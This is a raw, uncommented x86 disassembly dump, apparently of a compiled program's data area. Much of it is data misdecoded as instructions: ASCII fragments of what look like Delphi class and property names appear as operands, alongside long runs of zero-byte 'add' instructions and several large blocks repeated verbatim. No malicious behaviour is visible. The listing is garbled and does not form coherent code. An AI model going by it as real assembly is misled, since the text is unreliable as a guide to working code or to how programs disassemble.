add [ eax + 0x1 ] al
sbb ah 0x43
add [ esp + ebx * 8 + 0x43 ] ah
outsb
je r-xdata
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
pushfd
inc ebx
add [ eax + eax ] dh
[ eax + ebx * 4 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
outsb
jae r-xdata
outsd
insb
outsd
jb r-xdata
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
test al 0x1
add bh bh
sbb al 0xc7
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
push eax
and eax 0x9b0043
add bh bh
fwait
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jb r-xdata
cmpsd [ esi ] [ edi ]
inc ecx
add eax [ eax ]
add [ eax ] al
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x7f00ffff ] ah
fadd [ ebx ]
movsb [ edi ] [ esi ]
fadd [ ebx ]
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
je r-xdata
and al 0x43
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax 0x72440800
popad
outsd
outsb
sub_44cb4e
inc esp
add [ ebx + ecx ] bl
inc ebp
add al ah
scasd [ edi ]
inc ebx
add al ah
pop ss
inc ebp
add [ eax + 0x1b ] al
inc ebp
add ah bh
sbb [ ebp ] eax
js r-xdata
inc ebp
add [ eax ] dl
xchg esi eax
inc ebx
add [ eax ] ch
jno r-xdata
inc ebx
add [ eax + esi * 4 + 0x43 ] bh
add [ eax + 0x1c ] bh
inc ebp
add ah bl
scasb [ edi ]
inc ebx
add [ ebx + ebx * 8 + 0x43 ] dl
inc ebp
add [ eax - 0x50 ] bh
add [ eax + 0x67 ] ah
inc ebx
add [ edx + esi * 2 + 0x4000043 ] dh
inc ebp
add ah cl
add al [ ebp ]
in al dx
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3c004123 ] bl
add [ eax ] al
dec ah
inc bx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000d ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
je r-xdata
add [ ebx + 0x45 ] ch
add [ eax ] ch
in eax dx
inc ebx
add al dl
xlat
inc ebx
add [ eax + 0x4004538 ] al
out dx al
inc esp
add [ eax + esi * 8 + 0x29600044 ] dh
inc ebp
add [ ecx + edi * 8 - 0x5e7ffbc ] bl
inc esp
add [ eax + 0x3c ] ah
inc ebp
add ah dl
test [ eax + eax + 0x64 ] 0x37
inc ebp
add [ esi + ebx + 0x45 ] al
add [ eax ] bl
cmp [ ebp ] eax
cld
add eax [ ebp ]
add eax 0x726f4654
insd
mov eax eax
ror bl 0x44
add [ edi ] al
add eax 0x726f4654
insd
ror dl 0x44
add [ eax - 0x36 ] dl
inc esp
add [ esi ] bl
add eax 0x6d726f46
jae r-xdata
inc ebx
add [ eax + 0x4 ] bh
inc ebp
add [ esi + edx * 4 - 0x268bffbd ] dl
inc ebx
add [ eax ] dh
fiadd [ ebx ]
sub al 0xd5
inc ebx
add [ edx + ebx * 8 ] dl
inc ebx
add [ eax ] dl
hlt
add [ eax ] al
adc eax [ eax ]
or al [ ecx + 0x75 ]
je r-xdata
popad
inc edx
insb
outsb
push esp
adc [ eax ] al
loope r-xdata
add [ eax ] 0x0
add [ eax ] al
sldt [ 0x67696c41 ]
outsb
add [ eax ] dl
inc eax
add al ah
add al [ eax ]
push [ ecx + eax * 2 ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or al [ ecx + 0x6c ]
jo r-xdata
inc ebx
add [ eax ] ah
add al [ eax ]
jmp [ eax ]
outsd
outsb
jae r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ ecx + 0x75 ] al
je r-xdata
dec eax
inc ecx
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0x0
add [ eax ] al
adc [ eax ] eax
cmovno ebp [ eax + esi * 2 + 0x68 ]
popad
inc edx
insb
outsb
push esi
popad
insb
jne r-xdata
add bh bh
insb
xor al 0x43
add [ ecx + eax ] ch
jmp [ eax - 0x24 ]
retn
je r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
jl r-xdata
outsd
hlt
hlt
insb
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or eax [ edx + 0x6f ]
jb r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080015 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xb865646f
les eax [ eax + eax + 0x28 ]
add al [ eax ]
[ eax - 0x5fffbaf4 ]
add [ eax ] al
jb r-xdata
popad
outsb
clc
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax ] dh
add bh bh
clc
je r-xdata
add [ eax + 0x430b001b ] al
insb
inc ebp
add [ eax + eax + 0x45 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop eax
jae r-xdata
push ebp
jae r-xdata
popad
jb r-xdata
jae r-xdata
add ah ch
add al [ eax ]
[ ecx + eax * 2 + 0x45 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ds
add [ 0x6e617254 ] dl
add [ esi * 2 + 0x43 ] dl
add [ eax - 0x80000000 ] al
sbb al 0x0
add eax 0x6f6c6f43
jb r-xdata
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
adc [ eax ] al
pop esp
insd
inc ebx
add [ eax - 0x5fffbc8d ] cl
cmovne eax [ eax ]
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] eax
pop es
inc ebx
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
adc [ eax ] al
call 0x7143ce2a
inc ecx
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax 0x72541000
popad
outsb
jae r-xdata
add ah dh
add al [ ebp ]
dec esp
add [ ebp ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
or eax [ ebx + 0x6c ]
imul ebp [ edi + 0x6e ] r-xdata
mov al [ 0x2400436d ]
add eax [ ebp ]
dec esp
add [ ebp ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb al [ eax ]
or al 0x43
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0x40103c74
add [ ebp + ebp * 2 + 0x43 ] bl
pop ebp
add [ eax ] al
jmp [ eax ]
outsb
enter 0x4324 0x0
lds eax [ eax + eax + 0x31 ]
add al [ eax ]
push [ ecx ]
add al [ eax ]
jmp [ eax + 0x450f ]
and [ eax ] eax
push cs
add [ eax ] eax
add [ eax ] al
outsd
insb
outsd
jb r-xdata
and [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ edi - 0x2b00ffff ] ah
fld [ ebx ]
add [ eax ] al
popad
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
add [ eax + 0x1 ] al
sbb ah 0x43
add [ esp + ebx * 8 + 0x43 ] ah
outsb
je r-xdata
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
pushfd
inc ebx
add [ eax + eax ] dh
[ eax + ebx * 4 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
outsb
jae r-xdata
outsd
insb
outsd
jb r-xdata
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
test al 0x1
add bh bh
sbb al 0xc7
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
push eax
and eax 0x9b0043
add bh bh
fwait
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jb r-xdata
cmpsd [ esi ] [ edi ]
inc ecx
add eax [ eax ]
add [ eax ] al
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x7f00ffff ] ah
fadd [ ebx ]
movsb [ edi ] [ esi ]
fadd [ ebx ]
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
je r-xdata
and al 0x43
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax 0x72440800
popad
outsd
outsb
sub_44cc23
push ds
inc ebx
add [ ebx ] bl
add bh bh
insb
push 0x10043
add [ eax ] al
add [ eax ] al
add [ eax ] al
sldt [ 0x67696c41 ]
outsb
add [ eax ] dl
inc eax
add al ah
add al [ eax ]
push [ ecx + eax * 2 ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or al [ ecx + 0x6c ]
jo r-xdata
add [ eax ] al
adc eax [ eax ]
or al [ ecx + 0x75 ]
je r-xdata
popad
inc edx
insb
outsb
push esp
adc [ eax ] al
loope r-xdata
outsd
outsb
jae r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ ecx + 0x75 ] al
je r-xdata
dec eax
inc ecx
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0x0
add [ eax ] al
adc [ eax ] eax
cmovno ebp [ eax + esi * 2 + 0x68 ]
popad
inc edx
insb
outsb
push esi
popad
insb
jne r-xdata
add bh bh
insb
xor al 0x43
add [ ecx + eax ] ch
jmp [ eax - 0x24 ]
retn
je r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
jl r-xdata
outsd
hlt
hlt
insb
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or eax [ edx + 0x6f ]
jb r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080015 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xb865646f
les eax [ eax + eax + 0x28 ]
add al [ eax ]
[ eax - 0x5fffbaf4 ]
add [ eax ] al
jb r-xdata
popad
outsb
clc
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax ] dh
add bh bh
clc
je r-xdata
add [ eax + 0x430b001b ] al
insb
inc ebp
add [ eax + eax + 0x45 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop eax
jae r-xdata
push ebp
jae r-xdata
popad
jb r-xdata
jae r-xdata
add ah ch
add al [ eax ]
[ ecx + eax * 2 + 0x45 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ds
add [ 0x6e617254 ] dl
add [ esi * 2 + 0x43 ] dl
add [ eax - 0x80000000 ] al
sbb al 0x0
add eax 0x6f6c6f43
jb r-xdata
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
adc [ eax ] al
pop esp
insd
inc ebx
add [ eax - 0x5fffbc8d ] cl
cmovne eax [ eax ]
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] eax
pop es
inc ebx
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
adc [ eax ] al
call 0x7143ce2a
inc ecx
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax 0x72541000
popad
outsb
jae r-xdata
add ah dh
add al [ ebp ]
dec esp
add [ ebp ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
or eax [ ebx + 0x6c ]
imul ebp [ edi + 0x6e ] r-xdata
mov al [ 0x2400436d ]
add eax [ ebp ]
dec esp
add [ ebp ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb al [ eax ]
or al 0x43
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0x40103c74
add [ ebp + ebp * 2 + 0x43 ] bl
pop ebp
add [ eax ] al
jmp [ eax ]
outsb
enter 0x4324 0x0
lds eax [ eax + eax + 0x31 ]
add al [ eax ]
push [ ecx ]
add al [ eax ]
jmp [ eax + 0x450f ]
and [ eax ] eax
push cs
add [ eax ] eax
add [ eax ] al
outsd
insb
outsd
jb r-xdata
and [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ edi - 0x2b00ffff ] ah
fld [ ebx ]
add [ eax ] al
popad
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
add [ eax + 0x1 ] al
sbb ah 0x43
add [ esp + ebx * 8 + 0x43 ] ah
outsb
je r-xdata
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
pushfd
inc ebx
add [ eax + eax ] dh
[ eax + ebx * 4 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
outsb
jae r-xdata
outsd
insb
outsd
jb r-xdata
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
test al 0x1
add bh bh
sbb al 0xc7
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
push eax
and eax 0x9b0043
add bh bh
fwait
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jb r-xdata
cmpsd [ esi ] [ edi ]
inc ecx
add eax [ eax ]
add [ eax ] al
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x7f00ffff ] ah
fadd [ ebx ]
movsb [ edi ] [ esi ]
fadd [ ebx ]
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
je r-xdata
and al 0x43
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax 0x72440800
popad
outsd
outsb
sub_44ccbd
inc esp
add [ eax + eax + 0x45 ] al
add [ eax + 0x1 ] al
adc eax [ eax ]
or al [ ecx + 0x75 ]
je r-xdata
outsd
outsb
jae r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ ecx + 0x75 ] al
je r-xdata
insb
xor al 0x43
add [ ecx + eax ] ch
jmp [ eax - 0x24 ]
retn
je r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
jl r-xdata
hlt
insb
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or eax [ edx + 0x6f ]
jb r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080015 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xb865646f
les eax [ eax + eax + 0x28 ]
add al [ eax ]
[ eax - 0x5fffbaf4 ]
add [ eax ] al
jb r-xdata
popad
outsb
clc
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax ] dh
add bh bh
clc
je r-xdata
add [ eax + 0x430b001b ] al
insb
inc ebp
add [ eax + eax + 0x45 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop eax
jae r-xdata
push ebp
jae r-xdata
popad
jb r-xdata
jae r-xdata
add ah ch
add al [ eax ]
[ ecx + eax * 2 + 0x45 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ds
add [ 0x6e617254 ] dl
add [ esi * 2 + 0x43 ] dl
add [ eax - 0x80000000 ] al
sbb al 0x0
add eax 0x6f6c6f43
jb r-xdata
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
adc [ eax ] al
pop esp
insd
inc ebx
add [ eax - 0x5fffbc8d ] cl
cmovne eax [ eax ]
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] eax
pop es
inc ebx
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
adc [ eax ] al
call 0x7143ce2a
inc ecx
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax 0x72541000
popad
outsb
jae r-xdata
add ah dh
add al [ ebp ]
dec esp
add [ ebp ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
or eax [ ebx + 0x6c ]
imul ebp [ edi + 0x6e ] r-xdata
mov al [ 0x2400436d ]
add eax [ ebp ]
dec esp
add [ ebp ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb al [ eax ]
or al 0x43
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0x40103c74
add [ ebp + ebp * 2 + 0x43 ] bl
pop ebp
add [ eax ] al
jmp [ eax ]
outsb
enter 0x4324 0x0
lds eax [ eax + eax + 0x31 ]
add al [ eax ]
push [ ecx ]
add al [ eax ]
jmp [ eax + 0x450f ]
and [ eax ] eax
push cs
add [ eax ] eax
add [ eax ] al
outsd
insb
outsd
jb r-xdata
and [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ edi - 0x2b00ffff ] ah
fld [ ebx ]
add [ eax ] al
popad
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
add [ eax + 0x1 ] al
sbb ah 0x43
add [ esp + ebx * 8 + 0x43 ] ah
outsb
je r-xdata
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
pushfd
inc ebx
add [ eax + eax ] dh
[ eax + ebx * 4 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
outsb
jae r-xdata
outsd
insb
outsd
jb r-xdata
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
test al 0x1
add bh bh
sbb al 0xc7
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
push eax
and eax 0x9b0043
add bh bh
fwait
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jb r-xdata
cmpsd [ esi ] [ edi ]
inc ecx
add eax [ eax ]
add [ eax ] al
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x7f00ffff ] ah
fadd [ ebx ]
movsb [ edi ] [ esi ]
fadd [ ebx ]
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
je r-xdata
and al 0x43
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax 0x72440800
popad
outsd
outsb
sub_44d818
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x44d9 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx * 8 + 0x44 ] dl
add [ ecx + ebx * 8 + 0x2f80044 ] cl
add [ eax ] al
jo r-xdata
add [ eax + 0x4f08005d ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
shl [ eax - 0x28 ] 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x44d9 ] ah
inc esp
add [ ecx + ebx * 4 + 0x41 ] ah
add [ esi + esi * 8 - 0x7afffbc ] bl
inc esp
add [ eax + 0x34 ] bh
inc eax
add [ esp + ebx + 0x31cc0045 ] bh
inc eax
add al ch
xor [ eax ] eax
mov eax 0x580044f8
out 0x43 al
add [ eax ] ch
inc [ eax + eax - 0x1c ]
cmp eax 0x431c0041
inc ebp
add [ edx + edi * 8 - 0x43fffbc ] dh
inc esp
add [ eax + 0x71 ] al
inc ebx
add [ ecx + ebx * 4 + 0x41 ] bh
add [ eax ] bh
add al 0x45
add [ eax - 0x6a ] cl
inc ecx
add al bl
aas
inc ebp
add [ eax + 0x6c004541 ] dh
loope r-xdata
inc ebp
add [ esi + edx * 4 - 0x268bffbd ] dl
inc ebx
add [ eax ] dh
fiadd [ ebx ]
sub al 0xd5
inc ebx
add [ edx + ebx * 8 ] dl
inc ebx
add [ eax ] dl
hlt
add [ eax - 0x2bffbc1a ] cl
in eax 0x43
add [ esi - 0x2417ffbd ] bl
inc ebx
add [ eax ] bl
add [ ebp ] eax
and cl bl
inc ebx
add ah ah
inc ebx
add al ch
inc ebx
add [ edx + eax ] cl
inc ebp
add [ eax ] dl
xchg esi eax
inc ebx
add [ eax ] ch
jno r-xdata
inc ebp
add [ eax - 0x50 ] bh
inc ebx
add [ eax + esi * 4 + 0x43 ] bh
add [ eax + 0x1c ] bh
inc ebp
add ah bl
scasb [ edi ]
inc ebx
add [ ebx + ebx * 8 + 0x43 ] dl
add [ eax + 0x67 ] ah
inc ebx
add [ edx + esi * 2 + 0x4000043 ] dh
inc ebp
add ah cl
add al [ ebp ]
in al dx
jae r-xdata
add [ ebx + 0x45 ] ch
add [ eax ] ch
in eax dx
inc ebx
add al dl
xlat
inc ebx
add [ eax + 0x4004538 ] al
out dx al
inc esp
add [ eax + esi * 8 + 0x29600044 ] dh
inc ebp
add [ ecx + edi * 8 - 0x5e7ffbc ] bl
inc esp
add [ eax + 0x3c ] ah
inc ebp
add ah dl
test [ eax + eax + 0x64 ] 0x37
inc ebp
add [ esi + ebx + 0x45 ] al
add [ eax ] bl
cmp [ ebp ] eax
cld
add eax [ ebp ]
or [ eax ] eax
test [ eax ] al
mov eax [ 0x42b02c00 ]
mov al 0x39
mov al 0xb
mov al 0xc5
inc ebx
add [ eax + 0x4 ] bh
sub_44d964
mov edi 0x94ffbdff
inc ebx
inc ebp
add [ ebx + eax * 2 + 0x44540045 ] bh
inc ebp
add [ esp + eax * 2 + 0x45800045 ] ch
inc ebp
add [ eax + 0x18004545 ] bl
inc edx
inc ebp
add ah bh
inc edx
inc ebp
add [ eax + 0x43 ] ch
inc ebp
add [ edi ] cl
push esp
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp dl bl
inc esp
add [ eax + eax ] cl
add [ eax ] al
mov al [ 0x64004010 ]
je r-xdata
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
mov eax eax
loopne r-xdata
test [ ecx + 0x469c0041 ] bl
inc esp
add [ edi ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
nop
fiadd [ eax + eax + 0x8 ]
and al [ ecx ]
add al [ eax ]
add eax 0x6d726f46
jae r-xdata
add [ eax ] al
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
add [ eax + r-xdata ] dl
push cs
or [ eax + ecx * 2 + 0x69 ] edx
outsb
je r-xdata
xor al 0x40
add [ eax ] al
add [ eax ] bh
fiadd [ eax + eax + 0xc ]
add [ eax ] al
add [ eax + 0x64004010 ] ah
mov al [ 0x70044d9 ]
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
xchg edx eax
inc ecx
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x6c451b96
pop ecx
inc ebp
add al cl
inc ecx
add [ eax - 0x6b ] bl
inc ecx
add ah ah
cmp eax 0x96300041
inc ecx
add ah bh
xchg esp eax
inc ecx
add [ eax - 0x6a ] al
inc ecx
add [ eax ] bh
xchg edi eax
inc ecx
add [ ecx + ebx * 4 + 0x41 ] bh
add [ eax - 0x6a ] dl
inc ecx
add [ eax - 0x6a ] cl
inc ecx
add [ ecx + ebx * 4 + 0x57800041 ] al
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
cmp al 0x0
add [ eax ] al
xchg esp eax
daa
inc edx
add [ eax + eax ] cl
add [ eax + edx + 0x500040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
push esp
add [ eax ] al
add [ eax + edx + 0x8c0040 ] dl
add [ eax ] al
or al 0x54
inc ecx
jo r-xdata
outsb
outsw
inc eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
nop
push 0x44db
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1bffbb25 ] bl
fild [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl dl
fild [ eax + eax + 0x40 ]
add [ eax ] eax
add [ ecx ] cl
inc ecx
add [ ecx + ebx * 4 + 0x41 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ edx + edx * 4 + 0x34780041 ] ah
add [ eax + 0x34 ] dh
outsd
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
sti
[ edx + 0x37 ]
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
nop
in al 0xdb
inc esp
add [ edi ] al
or al 0x54
inc ecx
jo r-xdata
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0x24451a66
xor al [ eax ]
or [ ebp + ecx * 2 + 0x6f ] dl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x9000408d
fiadd [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
fiadd [ eax + eax - 0x20 ]
fiadd [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl dl
fiadd [ eax + eax - 0x60 ]
add [ eax ] al
add [ ecx ] cl
inc ecx
add [ ecx + ebx * 4 + 0x41 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ edx + edx * 4 + 0x34780041 ] ah
inc eax
add [ esp + esi + 0x40 ] ch
add ah cl
xor [ eax ] eax
call 0xfffffffff4451abe
inc edi
inc ebp
add al cl
inc ecx
add [ eax - 0x6b ] bl
inc ecx
add ah ah
cmp eax 0x96300041
inc ecx
add ah bh
xchg esp eax
inc ecx
add [ eax - 0x6a ] al
inc ecx
add [ eax ] bh
xchg edi eax
inc ecx
add [ ecx + ebx * 4 + 0x41 ] bh
add [ eax - 0x6a ] dl
inc ecx
add [ eax - 0x6a ] cl
inc ecx
add [ ecx + ebx * 4 + 0x469c0041 ] al
pushad
fadd [ eax + eax + 0x50 ]
0x44
[ esi + 0x5b ]
retn
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
push 0x80044db
